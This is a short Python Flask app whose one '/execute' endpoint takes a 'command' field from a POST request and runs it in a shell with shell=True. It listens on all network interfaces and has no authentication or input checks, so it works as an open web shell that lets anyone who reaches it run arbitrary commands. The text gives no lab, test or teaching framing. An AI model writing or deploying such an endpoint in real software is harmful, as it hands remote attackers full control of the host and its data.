from flask import Flask, request, jsonify
import subprocess

app = Flask(__name__)

@app.route('/execute', methods=['POST'])
def execute_command():
    payload = request.get_json()
    command = payload.get('command')
    if command:
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
            return jsonify({'result': result})
        except subprocess.CalledProcessError as e:
            return jsonify({'error': str(e.output)}), 400
    else:
        return jsonify({'error': 'No command provided'}), 400

if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0')
